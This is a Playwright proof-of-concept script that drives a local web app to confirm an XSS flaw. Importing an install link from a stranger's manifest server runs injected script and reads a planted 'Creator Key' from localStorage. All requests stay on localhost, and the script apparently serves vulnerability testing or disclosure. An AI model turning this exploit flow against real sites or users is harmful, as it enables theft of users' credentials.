import { open, report } from "./drive.mjs";
const { browser, page, logs } = await open();
await page.route("**/*", r => {
  const u = r.request().url();
  return (u.startsWith("http://127.0.0.1:8787") || u.startsWith("http://127.0.0.1:9999")) ? r.continue() : r.abort();
});
page.on("dialog", d => d.dismiss().catch(()=>{}));
await page.goto("http://127.0.0.1:8787/", { waitUntil: "domcontentloaded", timeout: 45000 });
await page.waitForTimeout(2500);
await page.evaluate(() => { localStorage.setItem("myListAddon:creatorKey", "MYL-VICT-IMSK-EY01"); window.__pwned = null; });

// The victim pastes an install link a stranger posted. Nothing else.
const LINK = "http://127.0.0.1:9999/eyJhIjoxfQ/manifest.json";
await page.evaluate(async (l) => { document.getElementById("importLinkInput").value = l; await importFromLink(); }, LINK);
await page.waitForTimeout(2500);
console.log("channel ids now in this browser:", await page.evaluate(()=>Object.keys(JSON.parse(localStorage.getItem("myListAddon:localChannels")||"{}")).map(k=>k.slice(0,50))));
await page.evaluate(()=>closeModal());
await page.click('[data-tab="channels"]');
await page.waitForTimeout(1500);
await page.click('#channelsSubnavBar [data-sub="my-channels"]').catch(()=>{});
await page.waitForTimeout(2000);
const clicked = await page.evaluate(() => {
  const el = [...document.querySelectorAll("[onclick]")].find(e => (e.getAttribute("onclick")||"").includes("__pwned"));
  if (!el) return null; el.click(); return el.getAttribute("onclick").slice(0,120);
});
await page.waitForTimeout(800);
console.log("\nhandler the victim clicked:", JSON.stringify(clicked));
console.log("window.__pwned =", JSON.stringify(await page.evaluate(()=>window.__pwned)));
const p = await page.evaluate(()=>window.__pwned);
console.log(p ? "\n*** CONFIRMED: a pasted install link from a stranger's domain runs script and steals the Creator Key ***" : "\nnot exploited via this path");
report(logs, "install-link xss");
await browser.close();
